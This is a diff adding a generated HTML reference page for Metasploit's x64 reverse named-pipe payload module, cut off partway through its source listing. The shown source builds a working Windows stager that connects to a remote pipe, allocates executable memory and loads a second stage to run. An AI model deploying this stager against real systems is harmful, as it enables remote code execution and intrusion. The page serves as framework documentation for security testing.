@@ -1,0 +1,1162 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>
+  Module: Msf::Payload::Windows::ReverseNamedPipe_x64
+  
+    &mdash; Documentation by YARD 0.9.26
+  
+</title>
+
+  <link rel="stylesheet" href="../../../css/style.css" type="text/css" />
+
+  <link rel="stylesheet" href="../../../css/common.css" type="text/css" />
+
+<script type="text/javascript">
+  pathId = "Msf::Payload::Windows::ReverseNamedPipe_x64";
+  relpath = '../../../';
+</script>
+
+
+  <script type="text/javascript" charset="utf-8" src="../../../js/jquery.js"></script>
+
+  <script type="text/javascript" charset="utf-8" src="../../../js/app.js"></script>
+
+
+  </head>
+  <body>
+    <div class="nav_wrap">
+      <iframe id="nav" src="../../../class_list.html?1"></iframe>
+      <div id="resizer"></div>
+    </div>
+
+    <div id="main" tabindex="-1">
+      <div id="header">
+        <div id="menu">
+  
+    <a href="../../../_index.html">Index (R)</a> &raquo;
+    <span class='title'><span class='object_link'><a href="../../../Msf.html" title="Msf (module)">Msf</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../../Payload.html" title="Msf::Payload (class)">Payload</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../Windows.html" title="Msf::Payload::Windows (module)">Windows</a></span></span>
+     &raquo; 
+    <span class="title">ReverseNamedPipe_x64</span>
+  
+</div>
+
+        <div id="search">
+  
+    <a class="full_list_link" id="class_list_link"
+        href="../../../class_list.html">
+
+        <svg width="24" height="24">
+          <rect x="0" y="4" width="24" height="4" rx="1" ry="1"></rect>
+          <rect x="0" y="12" width="24" height="4" rx="1" ry="1"></rect>
+          <rect x="0" y="20" width="24" height="4" rx="1" ry="1"></rect>
+        </svg>
+    </a>
+  
+</div>
+        <div class="clear"></div>
+      </div>
+
+      <div id="content"><h1>Module: Msf::Payload::Windows::ReverseNamedPipe_x64
+  
+  
+  
+</h1>
+<div class="box_info">
+  
+
+  
+  
+  
+  
+  <dl>
+      <dt>Includes:</dt>
+      <dd><span class='object_link'><a href="../TransportConfig.html" title="Msf::Payload::TransportConfig (module)">TransportConfig</a></span>, <span class='object_link'><a href="../Windows.html" title="Msf::Payload::Windows (module)">Msf::Payload::Windows</a></span>, <span class='object_link'><a href="BlockApi_x64.html" title="Msf::Payload::Windows::BlockApi_x64 (module)">BlockApi_x64</a></span>, <span class='object_link'><a href="Exitfunk_x64.html" title="Msf::Payload::Windows::Exitfunk_x64 (module)">Exitfunk_x64</a></span>, <span class='object_link'><a href="SendUUID_x64.html" title="Msf::Payload::Windows::SendUUID_x64 (module)">SendUUID_x64</a></span></dd>
+  </dl>
+  
+  
+
+  
+
+  
+  <dl>
+    <dt>Defined in:</dt>
+    <dd>lib/msf/core/payload/windows/x64/reverse_named_pipe_x64.rb</dd>
+  </dl>
+  
+</div>
+
+<h2>Overview</h2><div class="docstring">
+  <div class="discussion">
+    
+<p>Complex reverse_named_pipe payload generation for Windows ARCH_X86_64 ###</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div>
+
+
+  <h2>Constant Summary</h2>
+  
+  <h3 class="inherited">Constants included
+     from <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html" title="Rex::Payloads::Meterpreter::UriChecksum (module)">Rex::Payloads::Meterpreter::UriChecksum</a></span></h3>
+  <p class="inherited"><span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_CONN-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_CONN (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_CONN</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_CONN_MAX_LEN-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_CONN_MAX_LEN (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_CONN_MAX_LEN</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_INITJ-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INITJ (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INITJ</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_INITN-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INITN (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INITN</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_INITP-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INITP (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INITP</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_INITW-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INITW (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INITW</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_INIT_CONN-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INIT_CONN (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INIT_CONN</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_MIN_LEN-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_MIN_LEN (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_MIN_LEN</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_MODES-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_MODES (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_MODES</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_UUID_MIN_LEN-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_UUID_MIN_LEN (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_UUID_MIN_LEN</a></span></p>
+
+
+
+
+
+  
+    <h2>
+      Instance Method Summary
+      <small><a href="#" class="summary_toggle">collapse</a></small>
+    </h2>
+
+    <ul class="summary">
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#asm_reverse_named_pipe-instance_method" title="#asm_reverse_named_pipe (instance method)">#<strong>asm_reverse_named_pipe</strong>(opts = {})  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Generate an assembly stub with the configured feature set and options.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#generate-instance_method" title="#generate (instance method)">#<strong>generate</strong>  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Generate the first stage.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#generate_reverse_named_pipe-instance_method" title="#generate_reverse_named_pipe (instance method)">#<strong>generate_reverse_named_pipe</strong>(opts = {})  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Generate and compile the stager.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#include_send_uuid-instance_method" title="#include_send_uuid (instance method)">#<strong>include_send_uuid</strong>  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>By default, we don&#39;t want to send the UUID, but we&#39;ll send for certain payloads if requested.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#initialize-instance_method" title="#initialize (instance method)">#<strong>initialize</strong>(*args)  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Register reverse_named_pipe specific options.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#required_space-instance_method" title="#required_space (instance method)">#<strong>required_space</strong>  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Determine the maximum amount of space required for the features requested.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#transport_config-instance_method" title="#transport_config (instance method)">#<strong>transport_config</strong>(opts = {})  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+    </ul>
+  
+
+
+  
+  
+  
+  
+  
+  
+  
+  
+  <h3 class="inherited">Methods included from <span class='object_link'><a href="Exitfunk_x64.html" title="Msf::Payload::Windows::Exitfunk_x64 (module)">Exitfunk_x64</a></span></h3>
+  <p class="inherited"><span class='object_link'><a href="Exitfunk_x64.html#asm_exitfunk-instance_method" title="Msf::Payload::Windows::Exitfunk_x64#asm_exitfunk (method)">#asm_exitfunk</a></span></p>
+
+  
+  
+  
+  
+  
+  
+  
+  
+  <h3 class="inherited">Methods included from <span class='object_link'><a href="BlockApi_x64.html" title="Msf::Payload::Windows::BlockApi_x64 (module)">BlockApi_x64</a></span></h3>
+  <p class="inherited"><span class='object_link'><a href="BlockApi_x64.html#asm_block_api-instance_method" title="Msf::Payload::Windows::BlockApi_x64#asm_block_api (method)">#asm_block_api</a></span></p>
+
+  
+  
+  
+  
+  
+  
+  
+  
+  <h3 class="inherited">Methods included from <span class='object_link'><a href="SendUUID_x64.html" title="Msf::Payload::Windows::SendUUID_x64 (module)">SendUUID_x64</a></span></h3>
+  <p class="inherited"><span class='object_link'><a href="SendUUID_x64.html#asm_send_uuid-instance_method" title="Msf::Payload::Windows::SendUUID_x64#asm_send_uuid (method)">#asm_send_uuid</a></span>, <span class='object_link'><a href="SendUUID_x64.html#uuid_required_size-instance_method" title="Msf::Payload::Windows::SendUUID_x64#uuid_required_size (method)">#uuid_required_size</a></span></p>
+
+  
+  
+  
+  
+  
+  
+  
+  
+  <h3 class="inherited">Methods included from <span class='object_link'><a href="../Windows.html" title="Msf::Payload::Windows (module)">Msf::Payload::Windows</a></span></h3>
+  <p class="inherited"><span class='object_link'><a href="../Windows.html#apply_prepends-instance_method" title="Msf::Payload::Windows#apply_prepends (method)">#apply_prepends</a></span>, <span class='object_link'><a href="../Windows.html#exit_types-class_method" title="Msf::Payload::Windows.exit_types (method)">exit_types</a></span>, <span class='object_link'><a href="../Windows.html#handle_intermediate_stage-instance_method" title="Msf::Payload::Windows#handle_intermediate_stage (method)">#handle_intermediate_stage</a></span>, <span class='object_link'><a href="../Windows.html#replace_var-instance_method" title="Msf::Payload::Windows#replace_var (method)">#replace_var</a></span></p>
+
+  
+  
+  
+  
+  
+  
+  
+  
+  <h3 class="inherited">Methods included from <span class='object_link'><a href="PrependMigrate.html" title="Msf::Payload::Windows::PrependMigrate (module)">PrependMigrate</a></span></h3>
+  <p class="inherited"><span class='object_link'><a href="PrependMigrate.html#apply_prepend_migrate-instance_method" title="Msf::Payload::Windows::PrependMigrate#apply_prepend_migrate (method)">#apply_prepend_migrate</a></span>, <span class='object_link'><a href="PrependMigrate.html#prepend_migrate-instance_method" title="Msf::Payload::Windows::PrependMigrate#prepend_migrate (method)">#prepend_migrate</a></span>, <span class='object_link'><a href="PrependMigrate.html#prepend_migrate%3F-instance_method" title="Msf::Payload::Windows::PrependMigrate#prepend_migrate? (method)">#prepend_migrate?</a></span>, <span class='object_link'><a href="PrependMigrate.html#prepend_migrate_64-instance_method" title="Msf::Payload::Windows::PrependMigrate#prepend_migrate_64 (method)">#prepend_migrate_64</a></span></p>
+
+  
+  
+  
+  
+  
+  
+  
+  
+  <h3 class="inherited">Methods included from <span class='object_link'><a href="../TransportConfig.html" title="Msf::Payload::TransportConfig (module)">TransportConfig</a></span></h3>
+  <p class="inherited"><span class='object_link'><a href="../TransportConfig.html#transport_config_bind_named_pipe-instance_method" title="Msf::Payload::TransportConfig#transport_config_bind_named_pipe (method)">#transport_config_bind_named_pipe</a></span>, <span class='object_link'><a href="../TransportConfig.html#transport_config_bind_tcp-instance_method" title="Msf::Payload::TransportConfig#transport_config_bind_tcp (method)">#transport_config_bind_tcp</a></span>, <span class='object_link'><a href="../TransportConfig.html#transport_config_reverse_http-instance_method" title="Msf::Payload::TransportConfig#transport_config_reverse_http (method)">#transport_config_reverse_http</a></span>, <span class='object_link'><a href="../TransportConfig.html#transport_config_reverse_https-instance_method" title="Msf::Payload::TransportConfig#transport_config_reverse_https (method)">#transport_config_reverse_https</a></span>, <span class='object_link'><a href="../TransportConfig.html#transport_config_reverse_ipv6_tcp-instance_method" title="Msf::Payload::TransportConfig#transport_config_reverse_ipv6_tcp (method)">#transport_config_reverse_ipv6_tcp</a></span>, <span class='object_link'><a href="../TransportConfig.html#transport_config_reverse_named_pipe-instance_method" title="Msf::Payload::TransportConfig#transport_config_reverse_named_pipe (method)">#transport_config_reverse_named_pipe</a></span>, <span class='object_link'><a href="../TransportConfig.html#transport_config_reverse_tcp-instance_method" title="Msf::Payload::TransportConfig#transport_config_reverse_tcp (method)">#transport_config_reverse_tcp</a></span>, <span class='object_link'><a href="../TransportConfig.html#transport_config_reverse_udp-instance_method" title="Msf::Payload::TransportConfig#transport_config_reverse_udp (method)">#transport_config_reverse_udp</a></span>, <span class='object_link'><a href="../TransportConfig.html#transport_uri_components-instance_method" title="Msf::Payload::TransportConfig#transport_uri_components (method)">#transport_uri_components</a></span></p>
+
+  
+  
+  
+  
+  
+  
+  
+  
+  <h3 class="inherited">Methods included from <span class='object_link'><a href="../UUID/Options.html" title="Msf::Payload::UUID::Options (module)">UUID::Options</a></span></h3>
+  <p class="inherited"><span class='object_link'><a href="../UUID/Options.html#generate_payload_uuid-instance_method" title="Msf::Payload::UUID::Options#generate_payload_uuid (method)">#generate_payload_uuid</a></span>, <span class='object_link'><a href="../UUID/Options.html#generate_uri_uuid_mode-instance_method" title="Msf::Payload::UUID::Options#generate_uri_uuid_mode (method)">#generate_uri_uuid_mode</a></span>, <span class='object_link'><a href="../UUID/Options.html#record_payload_uuid-instance_method" title="Msf::Payload::UUID::Options#record_payload_uuid (method)">#record_payload_uuid</a></span>, <span class='object_link'><a href="../UUID/Options.html#record_payload_uuid_url-instance_method" title="Msf::Payload::UUID::Options#record_payload_uuid_url (method)">#record_payload_uuid_url</a></span></p>
+
+  
+  
+  
+  
+  
+  
+  
+  
+  <h3 class="inherited">Methods included from <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html" title="Rex::Payloads::Meterpreter::UriChecksum (module)">Rex::Payloads::Meterpreter::UriChecksum</a></span></h3>
+  <p class="inherited"><span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#generate_uri_checksum-instance_method" title="Rex::Payloads::Meterpreter::UriChecksum#generate_uri_checksum (method)">#generate_uri_checksum</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#generate_uri_uuid-instance_method" title="Rex::Payloads::Meterpreter::UriChecksum#generate_uri_uuid (method)">#generate_uri_uuid</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#process_uri_resource-instance_method" title="Rex::Payloads::Meterpreter::UriChecksum#process_uri_resource (method)">#process_uri_resource</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#uri_checksum_lookup-instance_method" title="Rex::Payloads::Meterpreter::UriChecksum#uri_checksum_lookup (method)">#uri_checksum_lookup</a></span></p>
+
+  
+  
+  
+  
+  
+  
+
+  <div id="instance_method_details" class="method_details_list">
+    <h2>Instance Method Details</h2>
+
+    
+      <div class="method_details first">
+  <h3 class="signature first" id="asm_reverse_named_pipe-instance_method">
+  
+    #<strong>asm_reverse_named_pipe</strong>(opts = {})  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Generate an assembly stub with the configured feature set and options.</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  <p class="tag_title">Parameters:</p>
+<ul class="param">
+  
+    <li>
+      
+        <span class='name'>opts</span>
+      
+      
+        <span class='type'>(<tt>Hash</tt>)</span>
+      
+      
+        <em class="default">(defaults to: <tt>{}</tt>)</em>
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>a customizable set of options</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+  
+    
+    
+    <p class="tag_title">Options Hash (<tt>opts</tt>):</p>
+    <ul class="option">
+      
+        <li>
+          <span class="name">:port</span>
+          <span class="type">(<tt>Fixnum</tt>)</span>
+          <span class="default">
+            
+          </span>
+          
+            &mdash; <div class='inline'>
+<p>The port to connect to</p>
+</div>
+          
+        </li>
+      
+        <li>
+          <span class="name">:exitfunk</span>
+          <span class="type">(<tt>String</tt>)</span>
+          <span class="default">
+            
+          </span>
+          
+            &mdash; <div class='inline'>
+<p>The exit method to use if there is an error, one of process, thread, or seh</p>
+</div>
+          
+        </li>
+      
+        <li>
+          <span class="name">:reliable</span>
+          <span class="type">(<tt>Bool</tt>)</span>
+          <span class="default">
+            
+          </span>
+          
+            &mdash; <div class='inline'>
+<p>Whether or not to enable error handling code</p>
+</div>
+          
+        </li>
+      
+    </ul>
+  
+
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109
+110
+111
+112
+113
+114
+115
+116
+117
+118
+119
+120
+121
+122
+123
+124
+125
+126
+127
+128
+129
+130
+131
+132
+133
+134
+135
+136
+137
+138
+139
+140
+141
+142
+143
+144
+145
+146
+147
+148
+149
+150
+151
+152
+153
+154
+155
+156
+157
+158
+159
+160
+161
+162
+163
+164
+165
+166
+167
+168
+169
+170
+171
+172
+173
+174
+175
+176
+177
+178
+179
+180
+181
+182
+183
+184
+185
+186
+187
+188
+189
+190
+191
+192
+193
+194
+195
+196
+197
+198
+199
+200
+201
+202
+203
+204
+205
+206
+207
+208
+209
+210
+211
+212
+213
+214
+215
+216
+217
+218
+219
+220
+221
+222
+223
+224
+225
+226
+227
+228
+229
+230
+231
+232
+233
+234
+235
+236
+237
+238
+239
+240
+241
+242
+243
+244
+245
+246
+247
+248
+249
+250
+251
+252
+253
+254
+255
+256
+257
+258
+259
+260
+261
+262
+263
+264
+265
+266
+267
+268
+269
+270
+271
+272
+273</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/x64/reverse_named_pipe_x64.rb', line 99</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_asm_reverse_named_pipe'>asm_reverse_named_pipe</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='op'>=</span><span class='lbrace'>{</span><span class='rbrace'>}</span><span class='rparen'>)</span>
+
+  <span class='comment'>#reliable       = opts[:reliable]
+</span>  <span class='id identifier rubyid_reliable'>reliable</span>       <span class='op'>=</span> <span class='kw'>false</span>
+  <span class='id identifier rubyid_retry_count'>retry_count</span>    <span class='op'>=</span> <span class='lbracket'>[</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:retry_count</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_to_i'>to_i</span><span class='comma'>,</span> <span class='int'>1</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_max'>max</span>
+  <span class='id identifier rubyid_full_pipe_name'>full_pipe_name</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\\\\\\\\</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:host</span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_content'>\\\\pipe\\\\</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:name</span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span>
+
+  <span class='id identifier rubyid_asm'>asm</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+    ; Input: RBP must be the address of &#39;api_call&#39;
+    ; Output: RDI will be the handle to the named pipe.
+
+    retry_start:
+      push </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_retry_count'>retry_count</span><span class='embexpr_end'>}</span><span class='tstring_content'>     ; retry counter
+      pop r14
+
+      ; Func(rcx, rdx, r8, r9, stack ...)
+    try_reverse_named_pipe:
+      call get_pipe_name
+      db &quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_full_pipe_name'>full_pipe_name</span><span class='embexpr_end'>}</span><span class='tstring_content'>&quot;, 0x00
+    get_pipe_name:
+      pop rcx                 ; lpFileName
+    ; Start by setting up the call to CreateFile
+      push 0                  ; alignment
+      push 0                  ; hTemplateFile
+      push 0                  ; dwFlagsAndAttributes
+      push 3                  ; dwCreationDisposition (OPEN_EXISTING)
+      xor r9, r9              ; lpSecurityAttributes
+      xor r8, r8              ; dwShareMode
+      mov rdx, 0xC0000000     ; dwDesiredAccess(GENERIC_READ|GENERIC_WRITE)
+      mov r10d, </span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_block_api_hash'>block_api_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>kernel32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>CreateFileA</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>
+      call rbp                ; CreateFileA(...)
+
+    ; check for failure
+      cmp rax, -1             ; did it work?
+      jnz connected
+
+    handle_connect_failure:
+      dec r14                 ; decrement the retry count
+      jnz retry_start
+  </span><span class='tstring_end'>^</span></span>
+
+  <span class='kw'>if</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:exitfunk</span><span class='rbracket'>]</span>
+    <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+    failure:
+      call exitfunk
+    </span><span class='tstring_end'>^</span></span>
+  <span class='kw'>else</span>
+    <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+    failure:
+      push 0x56A2B5F0         ; hardcoded to exitprocess for size
+      call rbp
+    </span><span class='tstring_end'>^</span></span>
+  <span class='kw'>end</span>
+
+  <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+    ; this  lable is required so that reconnect attempts include
+    ; the UUID stuff if required.
+    connected:
+      xchg rdi, rax           ; Save the file handler for later
+  </span><span class='tstring_end'>^</span></span>
+  <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_asm_write_uuid'>asm_write_uuid</span> <span class='kw'>if</span> <span class='id identifier rubyid_include_send_uuid'>include_send_uuid</span>
+
+  <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+    ; Receive the size of the incoming second stage...
+      push 0                  ; buffer for lpNumberOfBytesRead
+      mov r9, rsp             ; lpNumberOfBytesRead
+      push 0                  ; buffer for lpBuffer
+      mov rsi, rsp            ; lpNumberOfBytesRead
+      push 4                  ; sizeof(DWORD)
+      pop r8                  ; nNumberOfBytesToRead
+      push 0                  ; alignment
+      push 0                  ; lpOverlapped
+      mov rdx, rsi            ; lpBuffer
+      mov rcx, rdi            ; hFile
+      mov r10d, </span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_block_api_hash'>block_api_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>kernel32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>ReadFile</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>
+      call rbp                ; ReadFile(...)
+  </span><span class='tstring_end'>^</span></span>
+
+  <span class='kw'>if</span> <span class='id identifier rubyid_reliable'>reliable</span>
+    <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+    ; reliability: check to see if the received worked, and reconnect
+    ; if it fails
+      test eax, eax
+      jz cleanup_file
+      mov rax, [rsi+8]
+      test eax, eax
+      jz cleanup_file
+    </span><span class='tstring_end'>^</span></span>
+  <span class='kw'>end</span>
+
+  <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+
+    ; Alloc a RWX buffer for the second stage
+      add rsp, 0x30           ; slight stack adjustment
+      pop rsi                 ; pop off the second stage length
+      pop rax                 ; line the stack up again
+      mov esi, esi            ; only use the lower-order 32 bits for the size
+      push 0x40               ;
+      pop r9                  ; PAGE_EXECUTE_READWRITE
+      push 0x1000             ;
+      pop r8                  ; MEM_COMMIT
+      mov rdx, rsi            ; the newly recieved second stage length.
+      xor rcx, rcx            ; NULL as we dont care where the allocation is.
+      mov r10d, </span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_block_api_hash'>block_api_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>kernel32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>VirtualAlloc</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>
+      call rbp                ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
+      ; Receive the second stage and execute it...
+      mov rbx, rax            ; rbx = our new memory address for the new stage
+      mov r15, rax            ; save the address so we can jump into it later
+
+    read_more:
+      ; prepare the size min(0x10000, esi)
+      mov r8, 0x10000         ; stupid named pipe buffer limit
+      cmp r8, rsi
+      jle size_is_good
+      mov r8, rsi
+
+    size_is_good:
+      ; Invoke a read
+      push 0                  ; buffer for lpNumberOfBytesRead
+      mov r9, rsp             ; lpNumberOfBytesRead
+      mov rdx, rbx            ; lpBuffer
+      push 0                  ; lpOverlapped
+      mov rcx, rdi            ; hFile
+      mov r10d, </span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_block_api_hash'>block_api_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>kernel32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>ReadFile</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>
+      call rbp                ; ReadFile(...)
+      add rsp, 0x28           ; slight stack adjustment
+  </span><span class='tstring_end'>^</span></span>
+
+  <span class='kw'>if</span> <span class='id identifier rubyid_reliable'>reliable</span>
+    <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+    ; reliability: check to see if the read worked
+    ; if it fails
+      test eax, eax
+      jnz read_successful
+
+    ; something failed so free up memory
+      pop rax
+      push r15
+      pop rcx                 ; lpAddress
+      push 0x4000             ; MEM_DECOMMIT
+      pop r8                  ; dwFreeType
+      push 0                  ; 0
+      pop rdx                 ; dwSize
